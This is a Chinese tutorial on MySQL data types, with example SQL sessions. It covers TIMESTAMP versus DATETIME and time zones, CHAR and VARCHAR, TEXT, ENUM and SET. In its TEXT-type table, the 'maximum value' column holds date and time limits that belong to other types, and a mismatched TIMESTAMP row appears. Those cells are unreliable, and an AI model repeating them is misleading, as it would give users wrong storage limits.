<p>&#x5B58;&#x50A8;&#x6570;&#x636E;&#x65F6;&#x9700;&#x5BF9;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#x6240;&#x5728;&#x7684;&#x65F6;&#x533A;&#x8FDB;&#x884C;&#x8F6C;&#x6362;&#xFF0C;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#x518D;&#x5C06;&#x65F6;&#x95F4;&#x8F6C;&#x6362;&#x56DE;&#x5F53;&#x524D;&#x7684;&#x65F6;&#x533A;&#x3002;&#x56E0;&#x6B64;&#x4F7F;&#x7528;&#x5176;&#x5B58;&#x50A8;&#x7684;&#x540C;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x503C;&#xFF0C;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x533A;&#x67E5;&#x8BE2;&#x65F6;&#x4F1A;&#x663E;&#x793A;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x95F4;&#x3002;</p>
<pre><code class="language-sql">/*
1.&#x5411; TIMESTAMP &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;,&#x5F53;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x6EE1;&#x8DB3; YY-MM-DD HH:MM:SS &#x548C; YYMMDDHHMMSS,&#x4E24;&#x4F4D;&#x6570;&#x503C;&#x7684;&#x5E74;&#x4EFD;&#x540C;&#x6837;&#x7B26;&#x5408; YEAR &#x7C7B;&#x578B;&#x7684;&#x89C4;&#x5219;&#x6761;&#x4EF6;,&#x53EA;&#x4E0D;&#x8FC7;&#x8868;&#x793A;&#x7684;&#x65F6;&#x95F4;&#x8303;&#x56F4;&#x8981;&#x5C0F;&#x5F88;&#x591A;.
2.&#x5411; TIMESTAMP &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x63D2;&#x5165;&#x65F6;&#x95F4;&#x8D85;&#x51FA;&#x7C7B;&#x578B;&#x7684;&#x8303;&#x56F4;&#x5219;&#x4F1A;&#x629B;&#x51FA;&#x9519;&#x8BEF;&#x4FE1;&#x606F;.
*/
mysql&gt; CREATE TABLE test_timestamp1( ts TIMESTAMP );
mysql&gt; INSERT INTO test_timestamp1 VALUES (&apos;1999-01-01 03:04:50&apos;),(&apos;19990101030405&apos;),(&apos;99-01-01 03:04:05&apos;),(&apos;990101030405&apos;);
mysql&gt; INSERT INTO test_timestamp1 VALUES (&apos;2020@01@01@00@00@00&apos;),(&apos;20@01@01@00@00@00&apos;);
mysql&gt; INSERT INTO test_timestamp1 VALUES (CURRENT_TIMESTAMP()),(NOW());
#Incorrect datetime value
mysql&gt; INSERT INTO test_timestamp1 VALUES (&apos;2038-01-20 03:14:07&apos;);
mysql&gt; SELECT * FROM test_timestamp1;
</code></pre>
<ul>
<li>TIMESTAMP &#x548C; DATETIME &#x7684;&#x533A;&#x522B;</li>
</ul>
<p>&#x524D;&#x8005;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x6BD4;&#x8F83;&#x5C0F;&#xFF0C;&#x8868;&#x793A;&#x7684;&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x8303;&#x56F4;&#x4E5F;&#x6BD4;&#x8F83;&#x5C0F;&#xFF1B;&#x5728;&#x5E95;&#x5C42;&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x4E0A;&#xFF0C;&#x524D;&#x8005;&#x5E95;&#x5C42;&#x5B58;&#x50A8;&#x7684;&#x662F;&#x6BEB;&#x79D2;&#x503C;&#xFF0C;&#x8DDD;&#x79BB; 1970-1-1 0:0:0 &#x6BEB;&#x79D2;&#x7684;&#x6BEB;&#x79D2;&#x503C;&#xFF1B;&#x5728;&#x4E24;&#x4E2A;&#x65E5;&#x671F;&#x6BD4;&#x8F83;&#x5927;&#x5C0F;&#x6216;&#x65E5;&#x671F;&#x8BA1;&#x7B97;&#x65F6;&#xFF0C;&#x524D;&#x8005;&#x66F4;&#x65B9;&#x4FBF;&#x3001;&#x66F4;&#x5FEB;&#xFF1B;&#x524D;&#x8005;&#x548C;&#x65F6;&#x533A;&#x6709;&#x5173;&#xFF0C;&#x4F1A;&#x6839;&#x636E;&#x7528;&#x6237;&#x7684;&#x65F6;&#x533A;&#x4E0D;&#x540C;&#xFF0C;&#x663E;&#x793A;&#x4E0D;&#x540C;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x800C;&#x540E;&#x8005;&#x5219;&#x53EA;&#x80FD;&#x53CD;&#x6620;&#x51FA;&#x63D2;&#x5165;&#x65F6;&#x5F53;&#x5730;&#x7684;&#x65F6;&#x533A;&#xFF0C;&#x5176;&#x4ED6;&#x65F6;&#x533A;&#x7684;&#x4EBA;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5FC5;&#x7136;&#x4F1A;&#x6709;&#x8BEF;&#x5DEE;&#x3002;</p>
<pre><code class="language-sql">mysql&gt; CREATE TABLE temp_time(d1 DATETIME,d2 TIMESTAMP);
mysql&gt; INSERT INTO temp_time VALUES(&apos;2021-4-22 16:18:52&apos;,&apos;2021-4-22 16:18:52&apos;);
mysql&gt; INSERT INTO temp_time VALUES(NOW(),NOW());
mysql&gt; SELECT * FROM temp_time;
# &#x4FEE;&#x6539;&#x5F53;&#x524D;&#x7684;&#x65F6;&#x533A;
SET time_zone = &apos;+9:00&apos;;
mysql&gt; SELECT * FROM temp_time;
</code></pre>
<p>&#x5F00;&#x53D1;&#x4E2D;&#x7528;&#x5F97;&#x6700;&#x591A;&#x7684;&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x7C7B;&#x578B;&#xFF0C;&#x5C31;&#x662F; DATETIME&#x3002;&#x867D;&#x7136;&#x6570;&#x636E;&#x5E93;&#x4E5F;&#x652F;&#x6301;&#x5176;&#x4ED6;&#x7C7B;&#x578B;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5B9E;&#x9645;&#x9879;&#x76EE;&#x4E2D;&#xFF0C;&#x5C3D;&#x91CF;&#x7528; DATETIME &#x7C7B;&#x578B;&#x3002;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5305;&#x62EC;&#x4E86;&#x5B8C;&#x6574;&#x7684;&#x65E5;&#x671F;&#x548C;&#x65F6;&#x95F4;&#x4FE1;&#x606F;&#xFF0C;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x4E5F;&#x6700;&#x5927;&#xFF0C;&#x4F7F;&#x7528;&#x8D77;&#x6765;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#x3002;&#x82E5;&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x4FE1;&#x606F;&#x5206;&#x6563;&#x5728;&#x597D;&#x51E0;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;&#x5728;&#x4E0D;&#x6613;&#x8BB0;&#x5FC6;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019; SQL &#x8BED;&#x53E5;&#x4E5F;&#x4F1A;&#x66F4;&#x52A0;&#x590D;&#x6742;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x4E00;&#x822C;&#x5B58;&#x6CE8;&#x518C;&#x65F6;&#x95F4;&#x3001;&#x5546;&#x54C1;&#x53D1;&#x5E03;&#x65F6;&#x95F4;&#x7B49;&#xFF0C;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528; DATETIME &#x5B58;&#x50A8;&#xFF0C;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x65F6;&#x95F4;&#x6233;&#xFF0C;&#x56E0;&#x4E3A; DATETIME &#x867D;&#x7136;&#x76F4;&#x89C2;&#xFF0C;&#x4F46;&#x4E0D;&#x4FBF;&#x4E8E;&#x8BA1;&#x7B97;&#x3002;</p>
<pre><code class="language-sql">mysql&gt; SELECT UNIX_TIMESTAMP();
</code></pre>
<h3 id="%E6%96%87%E6%9C%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B">&#x6587;&#x672C;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</h3>
<ul>
<li>CHAR &#x4E0E; VARCHAR</li>
</ul>
<p>CHAR(M) &#x7C7B;&#x578B;&#x901A;&#x5E38;&#x9700;&#x9884;&#x5148;&#x5B9A;&#x4E49;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x3002;&#x82E5;&#x4E0D;&#x6307;&#x5B9A; M&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x957F;&#x5EA6;&#x662F; 1 &#x4E2A;&#x5B57;&#x7B26;&#x3002;&#x82E5;&#x4FDD;&#x5B58;&#x6570;&#x636E;&#x5B9E;&#x9645;&#x957F;&#x5EA6;&#x8F83;&#x58F0;&#x660E;&#x65F6;&#x5C0F;&#xFF0C;&#x5219;&#x4F1A;&#x5728;&#x53F3;&#x4FA7;&#x586B;&#x5145;&#x7A7A;&#x683C;&#x4EE5;&#x8FBE;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x957F;&#x5EA6;&#x3002;&#x6570;&#x636E;&#x5E93;&#x68C0;&#x7D22; CHAR &#x7C7B;&#x578B;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5176;&#x5B57;&#x6BB5;&#x4F1A;&#x53BB;&#x9664;&#x5C3E;&#x90E8;&#x7A7A;&#x683C;&#x3002;CHAR &#x7C7B;&#x578B;&#x5B57;&#x6BB5;&#x5728;&#x5B9A;&#x4E49;&#x65F6;&#xFF0C;&#x58F0;&#x660E;&#x7684;&#x5B57;&#x6BB5;&#x957F;&#x5EA6;&#x5373;&#x4E3A; CHAR &#x7C7B;&#x578B;&#x5B57;&#x6BB5;&#x6240;&#x5360;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x7684;&#x5B57;&#x8282;&#x6570;&#x3002;</p>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test_char1(c1 CHAR,c2 CHAR(5));
mysql&gt; DESC test_char1;
mysql&gt; INSERT INTO test_char1 VALUES(&apos;a&apos;,&apos;zs&apos;);
mysql&gt; SELECT c1,CONCAT(c2,&apos;***&apos;) FROM test_char1;
mysql&gt; INSERT INTO test_char1(c2) VALUES(&apos;a  &apos;);
mysql&gt; SELECT CHAR_LENGTH(c2) FROM test_char1;
</code></pre>
<p>VARCHAR(M) &#x5728;&#x5B9A;&#x4E49;&#x65F6;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x957F;&#x5EA6; M&#xFF0C;&#x5426;&#x5219;&#x62A5;&#x9519;&#x3002;MySQL &#x6570;&#x636E;&#x5E93;&#x7248;&#x672C;&#x4F4E;&#x4E8E; 4.0 &#x65F6;&#xFF0C;varchar(20) &#x6307;&#x7684;&#x662F; 20 &#x5B57;&#x8282;&#xFF0C;&#x53EA;&#x80FD;&#x5B58; 6 &#x4E2A; UTF8 &#x6C49;&#x5B57;&#xFF0C;&#x5373;&#x6BCF;&#x4E2A;&#x6C49;&#x5B57; 3 &#x5B57;&#x8282;&#xFF1B;MySQL5.0 &#x7248;&#x672C;&#x4EE5;&#x4E0A;&#xFF0C;varchar(20) &#x6307;&#x7684;&#x662F; 20 &#x5B57;&#x7B26;&#x3002;&#x68C0;&#x7D22; VARCHAR &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F1A;&#x4FDD;&#x7559;&#x6570;&#x636E;&#x5C3E;&#x90E8;&#x7684;&#x7A7A;&#x683C;&#x3002;VARCHAR &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x6240;&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x5B9E;&#x9645;&#x957F;&#x5EA6;&#x52A0; 1 &#x4E2A;&#x5B57;&#x8282;&#x3002;</p>
<pre><code class="language-sql">/* &#x9519;&#x8BEF; */
# ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;)&apos; at line 1
mysql&gt; CREATE TABLE test_varchar1(NAME VARCHAR);
# Column length too big for column &apos;NAME&apos; (max = 21845);
mysql&gt; CREATE TABLE test_varchar2 (NAME VARCHAR(65535));
mysql&gt; CREATE TABLE test_varchar3 (NAME VARCHAR(5));
mysql&gt; INSERT INTO test_varchar3 VALUES(&apos;zs&apos;),(&apos;zszy&apos;);
#Data too long for column &apos;NAME&apos; at row 1
mysql&gt; INSERT INTO test_varchar3 VALUES(&apos;zszszs&apos;);
</code></pre>
<ul>
<li>CHAR &#x548C; VARCHAR &#x7684;&#x9009;&#x62E9;</li>
</ul>
<p>&#x5728;&#x5B58;&#x50A8;&#x8F83;&#x77ED;&#xFF08;&#x95E8;&#x724C;&#x53F7;&#x7801;&#xFF09;&#xFF0C;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#xFF08;&#x4E3B;&#x952E; uuid&#xFF09;&#xFF0C;&#x9891;&#x7E41;&#x6539;&#x52A8;&#x7684;&#x4FE1;&#x606F;&#x65F6;&#xFF0C;&#x9009;&#x62E9;&#x524D;&#x8005;&#x7C7B;&#x578B;&#x66F4;&#x597D;&#x3002;&#x56E0; varchar &#x8FD8;&#x9700;&#x8981;&#x989D;&#x5916;&#x5360;&#x7528;&#x4E00;&#x4E2A; byte &#x7528;&#x4E8E;&#x5B58;&#x50A8;&#x4FE1;&#x606F;&#x7684;&#x957F;&#x5EA6;&#x3002;&#x5176;&#x6B21;&#x540E;&#x8005;&#x52A8;&#x6001;&#x957F;&#x5EA6;&#x7684;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#xFF0C;&#x5728;&#x9891;&#x7E41;&#x6539;&#x53D8;&#x5B58;&#x50A8;&#x4FE1;&#x606F;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x6B21;&#x8FC7;&#x7A0B;&#x90FD;&#x4F1A;&#x56E0;&#x8BA1;&#x7B97;&#x9020;&#x6210;&#x4E00;&#x5B9A;&#x7684;&#x6027;&#x80FD;&#x6D88;&#x8017;&#x3002;</p>
<p>&#x4ECE;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x5206;&#x6790;&#xFF0C;MyISAM &#x6570;&#x636E;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x6700;&#x597D;&#x4F7F;&#x7528;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x5217;&#x4EE3;&#x66FF;&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x5217;&#x3002;&#x6574;&#x4E2A;&#x8868;&#x7684;&#x9759;&#x6001;&#x5316;&#x4F7F;&#x6570;&#x636E;&#x68C0;&#x7D22;&#x66F4;&#x5FEB;&#xFF0C;&#x7528;&#x7A7A;&#x95F4;&#x6362;&#x65F6;&#x95F4;&#x3002;MEMORY &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x76EE;&#x524D;&#x90FD;&#x4F7F;&#x7528;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x884C;&#x5B58;&#x50A8;&#xFF0C;&#x6545;&#x4E0D;&#x8BBA;&#x54EA;&#x4E00;&#x79CD;&#x90FD;&#x662F;&#x4F5C;&#x4E3A; char &#x7C7B;&#x578B;&#x5904;&#x7406;&#x7684;&#x3002;InnoDB &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528; varchar &#x7C7B;&#x578B;&#x3002;&#x56E0;&#x4E3A;&#x5BF9;&#x4E8E; InnoDB &#x6570;&#x636E;&#x8868;&#xFF0C;&#x5185;&#x90E8;&#x7684;&#x884C;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x5E76;&#x6CA1;&#x6709;&#x533A;&#x5206;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x548C;&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x5217;&#xFF0C;&#x5373;&#x6240;&#x6709;&#x6570;&#x636E;&#x884C;&#x90FD;&#x4F7F;&#x7528;&#x6307;&#x5411;&#x6570;&#x636E;&#x5217;&#x503C;&#x7684;&#x5934;&#x6307;&#x9488;&#xFF0C;&#x800C;&#x4E14;&#x4E3B;&#x8981;&#x5F71;&#x54CD;&#x6027;&#x80FD;&#x7684;&#x56E0;&#x7D20;&#x662F;&#x6570;&#x636E;&#x884C;&#x4F7F;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x603B;&#x91CF;&#xFF0C;&#x7531;&#x4E8E; char &#x5E73;&#x5747;&#x5360;&#x7528;&#x7684;&#x7A7A;&#x95F4;&#x591A;&#x4E8E; varchar&#xFF0C;&#x9664;&#x4E86;&#x7B80;&#x77ED;&#x5E76;&#x4E14;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#xFF0C;&#x5176;&#x4ED6;&#x8003;&#x8651; varchar&#x3002;&#x8FD9;&#x6837;&#x8282;&#x7701;&#x7A7A;&#x95F4;&#xFF0C;&#x5BF9;&#x78C1;&#x76D8; I/O &#x548C;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x603B;&#x91CF;&#x6BD4;&#x8F83;&#x597D;&#x3002;</p>
<ul>
<li>TEXT &#x7C7B;&#x578B;</li>
</ul>
<p>TEXT &#x4FDD;&#x5B58;&#x6587;&#x672C;&#x7C7B;&#x578B;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5728;&#x5411; TEXT &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x4FDD;&#x5B58;&#x548C;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x6309;&#x7167;&#x5B9E;&#x9645;&#x957F;&#x5EA6;&#x5B58;&#x50A8;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x9884;&#x5148;&#x5B9A;&#x4E49;&#x957F;&#x5EA6;&#x3002;&#x7531;&#x4E8E;&#x5B9E;&#x9645;&#x5B58;&#x50A8;&#x957F;&#x5EA6;&#x4E0D;&#x786E;&#x5B9A;&#xFF0C;MySQL &#x4E0D;&#x5141;&#x8BB8; TEXT &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x505A;&#x4E3B;&#x952E;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x6587;&#x672C;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x7279;&#x70B9;</th>
<th style="text-align:center">&#x957F;&#x5EA6;</th>
<th style="text-align:center">&#x957F;&#x5EA6;&#x8303;&#x56F4;</th>
<th style="text-align:center">&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;</th>
<th style="text-align:center">&#x6700;&#x5927;&#x503C;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">TINYTEXT</td>
<td style="text-align:center">&#x5C0F;&#x6587;&#x672C;&#x3001;&#x53EF;&#x53D8;&#x957F;&#x5EA6;</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 255</td>
<td style="text-align:center">L + 2 &#x4E2A;&#x5B57;&#x8282;</td>
<td style="text-align:center">2155</td>
</tr>
<tr>
<td style="text-align:center">TEXT</td>
<td style="text-align:center">&#x6587;&#x672C;&#x3001;&#x53EF;&#x53D8;&#x957F;&#x5EA6;</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 65535</td>
<td style="text-align:center">L + 2 &#x4E2A;&#x5B57;&#x8282;</td>
<td style="text-align:center">838:59:59</td>
</tr>
<tr>
<td style="text-align:center">MEDIUMTEXT</td>
<td style="text-align:center">&#x4E2D;&#x7B49;&#x6587;&#x672C;&#x3001;&#x53EF;&#x53D8;&#x957F;&#x5EA6;</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L &lt;= 16777215</td>
<td style="text-align:center">L + 3 &#x4E2A;&#x5B57;&#x8282;</td>
<td style="text-align:center">9999-12-03</td>
</tr>
<tr>
<td style="text-align:center">LONGTEXT</td>
<td style="text-align:center">&#x5927;&#x6587;&#x672C;&#x3001;&#x53EF;&#x53D8;&#x957F;&#x5EA6;</td>
<td style="text-align:center">L</td>
<td style="text-align:center">0 &lt;= L&lt;= 4294967295&#xFF08;&#x76F8;&#x5F53;&#x4E8E;4GB&#xFF09;</td>
<td style="text-align:center">L + 4 &#x4E2A;&#x5B57;&#x8282;</td>
<td style="text-align:center">9999-12-31 23:59:59</td>
</tr>
<tr>
<td style="text-align:center">TIMESTAMP</td>
<td style="text-align:center">&#x65E5;&#x671F;&#x65F6;&#x95F4;</td>
<td style="text-align:center">4</td>
<td style="text-align:center">YYYY-MM-DD HH:MM:SS</td>
<td style="text-align:center">1970-01-01 00:00:00 UTC</td>
<td style="text-align:center">2038-01-19 03:14:07UTC</td>
</tr>
</tbody>
</table>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test_text(tx TEXT);
mysql&gt; INSERT INTO test_text VALUES(&apos;zszszy   &apos;);
# &#x4FDD;&#x5B58;&#x548C;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x65F6;&#x5E76;&#x6CA1;&#x6709;&#x5220;&#x9664;TEXT&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;&#x5C3E;&#x90E8;&#x7684;&#x7A7A;&#x683C;
mysql&gt; SELECT CHAR_LENGTH(tx) FROM test_text; # 9
</code></pre>
<p>&#x5F00;&#x53D1;&#x4E2D; TEXT &#x6587;&#x672C;&#x7C7B;&#x578B;&#xFF0C;&#x53EF;&#x4EE5;&#x5B58;&#x6BD4;&#x8F83;&#x5927;&#x7684;&#x6587;&#x672C;&#x6BB5;&#xFF0C;&#x641C;&#x7D22;&#x901F;&#x5EA6;&#x7A0D;&#x6162;&#xFF0C;&#x56E0;&#x6B64;&#x5982;&#x679C;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x5927;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528; CHAR&#xFF0C;VARCHAR &#x6765;&#x4EE3;&#x66FF;&#x3002;&#x8FD8;&#x6709; TEXT &#x7C7B;&#x578B;&#x4E0D;&#x7528;&#x52A0;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x52A0;&#x4E86;&#x4E5F;&#x6CA1;&#x7528;&#x3002;&#x800C;&#x4E14; text &#x548C; blob &#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;&#x5220;&#x9664;&#x540E;&#x5BB9;&#x6613;&#x5BFC;&#x81F4;&#x201C;&#x7A7A;&#x6D1E;&#x201D;&#xFF0C;&#x4F7F;&#x5F97;&#x6587;&#x4EF6;&#x788E;&#x7247;&#x6BD4;&#x8F83;&#x591A;&#xFF0C;&#x6240;&#x4EE5;&#x9891;&#x7E41;&#x4F7F;&#x7528;&#x7684;&#x8868;&#x4E0D;&#x5EFA;&#x8BAE;&#x5305;&#x542B; TEXT &#x7C7B;&#x578B;&#x5B57;&#x6BB5;&#xFF0C;&#x5EFA;&#x8BAE;&#x5355;&#x72EC;&#x5206;&#x51FA;&#x53BB;&#xFF0C;&#x5355;&#x72EC;&#x7528;&#x4E00;&#x4E2A;&#x8868;&#x3002;</p>
<ul>
<li>ENUM &#x7C7B;&#x578B;</li>
</ul>
<p>ENUM &#x7C7B;&#x578B;&#x4E5F;&#x53EB;&#x4F5C;&#x679A;&#x4E3E;&#x7C7B;&#x578B;&#xFF0C;ENUM &#x7C7B;&#x578B;&#x7684;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x9700;&#x8981;&#x5728;&#x5B9A;&#x4E49;&#x5B57;&#x6BB5;&#x65F6;&#x8FDB;&#x884C;&#x6307;&#x5B9A;&#x3002;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x503C;&#x65F6;&#xFF0C;ENUM&#x7C7B;&#x578B;&#x53EA;&#x5141;&#x8BB8;&#x4ECE;&#x6210;&#x5458;&#x4E2D;&#x9009;&#x53D6;&#x5355;&#x4E2A;&#x503C;&#xFF0C;&#x4E0D;&#x80FD;&#x4E00;&#x6B21;&#x9009;&#x53D6;&#x591A;&#x4E2A;&#x503C;&#x3002;&#x5176;&#x6240;&#x9700;&#x8981;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x7531;&#x5B9A;&#x4E49;ENUM&#x7C7B;&#x578B;&#x65F6;&#x6307;&#x5B9A;&#x7684;&#x6210;&#x5458;&#x4E2A;&#x6570;&#x51B3;&#x5B9A;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x6587;&#x672C;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x957F;&#x5EA6;</th>
<th style="text-align:center">&#x957F;&#x5EA6;&#x8303;&#x56F4;</th>
<th style="text-align:center">&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ENUM</td>
<td style="text-align:center">L</td>
<td style="text-align:center">1 &lt;= L &lt;= 65535</td>
<td style="text-align:center">1&#x6216;2&#x4E2A;&#x5B57;&#x8282;</td>
</tr>
</tbody>
</table>
<p>&#x5F53;ENUM&#x7C7B;&#x578B;&#x5305;&#x542B;1&#xFF5E;255&#x4E2A;&#x6210;&#x5458;&#x65F6;&#xFF0C;&#x9700;&#x8981;1&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF1B;</p>
<p>&#x5F53;ENUM&#x7C7B;&#x578B;&#x5305;&#x542B;256&#xFF5E;65535&#x4E2A;&#x6210;&#x5458;&#x65F6;&#xFF0C;&#x9700;&#x8981;2&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x3002;</p>
<p>ENUM&#x7C7B;&#x578B;&#x7684;&#x6210;&#x5458;&#x4E2A;&#x6570;&#x7684;&#x4E0A;&#x9650;&#x4E3A;65535&#x4E2A;&#x3002;</p>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test_enum(season ENUM(&apos;&#x6625;&apos;,&apos;&#x590F;&apos;,&apos;&#x79CB;&apos;,&apos;&#x51AC;&apos;,&apos;unknow&apos;));
mysql&gt; INSERT INTO test_enum VALUES (&apos;&#x6625;&apos;), (&apos;&#x79CB;&apos;);
# &#x5FFD;&#x7565;&#x5927;&#x5C0F;&#x5199;
mysql&gt; INSERT INTO test_enum VALUES(&apos;UNKNOW&apos;);
# &#x5141;&#x8BB8;&#x6309;&#x7167;&#x89D2;&#x6807;&#x7684;&#x65B9;&#x5F0F;&#x83B7;&#x53D6;&#x6307;&#x5B9A;&#x7D22;&#x5F15;&#x4F4D;&#x7F6E;&#x7684;&#x679A;&#x4E3E;&#x503C; =&gt; 1 &#x5F00;&#x59CB;
mysql&gt; INSERT INTO test_enum VALUES(&apos;1&apos;),(3);
# Data truncated for column &apos;season&apos; at row 1
mysql&gt; INSERT INTO test_enum VALUES(&apos;ab&apos;);
# &#x5F53; ENUM &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x6CA1;&#x6709;&#x58F0;&#x660E;&#x4E3A; NOT NULL &#x65F6;,&#x63D2;&#x5165; NULL &#x4E5F;&#x662F;&#x6709;&#x6548;&#x7684;
mysql&gt; INSERT INTO test_enum VALUES(NULL);
</code></pre>
<ul>
<li>SET&#x7C7B;&#x578B;</li>
</ul>
<p>SET &#x8868;&#x793A;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x5BF9;&#x8C61;&#xFF0C;&#x53EF;&#x4EE5;&#x5305;&#x542B; 0 &#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x6210;&#x5458;&#xFF0C;&#x4F46;&#x6210;&#x5458;&#x4E2A;&#x6570;&#x7684;&#x4E0A;&#x9650;&#x4E3A; 64&#x3002;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x503C;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x53D6;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x5185;&#x7684; 0 &#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x503C;&#x3002;&#x5F53;SET&#x7C7B;&#x578B;&#x5305;&#x542B;&#x7684;&#x6210;&#x5458;&#x4E2A;&#x6570;&#x4E0D;&#x540C;&#x65F6;&#xFF0C;&#x5176;&#x6240;&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x4E5F;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x3002;SET&#x7C7B;&#x578B;&#x5728;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x65F6;&#x6210;&#x5458;&#x4E2A;&#x6570;&#x8D8A;&#x591A;&#xFF0C;&#x5176;&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x8D8A;&#x5927;&#x3002;&#x6CE8;&#x610F;&#xFF1A;SET&#x7C7B;&#x578B;&#x5728;&#x9009;&#x53D6;&#x6210;&#x5458;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x4E00;&#x6B21;&#x9009;&#x62E9;&#x591A;&#x4E2A;&#x6210;&#x5458;&#xFF0C;&#x8FD9;&#x4E00;&#x70B9;&#x4E0E;ENUM&#x7C7B;&#x578